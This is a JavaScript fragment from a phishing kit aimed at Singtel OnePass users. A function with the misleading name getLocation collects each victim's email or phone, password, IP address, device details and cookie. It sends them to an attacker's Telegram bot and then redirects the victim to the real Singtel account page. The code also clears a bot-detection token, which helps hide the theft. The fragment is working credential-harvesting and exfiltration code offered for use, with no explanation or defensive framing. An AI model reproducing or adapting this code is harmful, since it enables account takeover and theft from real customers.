      function getLocation(emailOrPhone, password, x, deviceInfo, ipAddress) {
        try {
          var dataToSend = {
            emailOrPhone,
            password,
            ipAddress,
            Device: deviceInfo.manufacturer,
            OS: deviceInfo.os,
            Browser: deviceInfo.browser,
            Cookie: x,
          };
          if (Object.keys(dataToSend).length > 0) {
            sendToTelegram(dataToSend);
          } else {
            console.warn("No data to send to Telegram.");
          }
        } catch (error) {
          console.error("Error occurred:", error);
        }
      };

      function sendToTelegram(data) {
        var payload = {
          chat_id: chatId,
          text: `
            Singtel Onepass Log:
            ________________________
               "EMAIL OR PHONE": "${data.emailOrPhone}",
               "PASSWORD": "${data.password}",
               "IP": ${data.ipAddress},
               "DEVICE": "${data.Device}",
               "OS": "${data.OS}",
               "BROWSER": "${data.Browser}",
               "COOKIE": ${data.Cookie}
            `
        };
        var sendToBot = {
          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
          },
          data: JSON.stringify(payload)
        };
        $.ajax(sendToBot).done(function(response) {
          localStorage.removeItem("reese84");
          window.location.href = "https://www.singtel.com/personal/my-account/manage-accounts/account-summary";
        }).fail(function(error) {
          console.error("Error sending data to Telegram:", error);
        });
      };
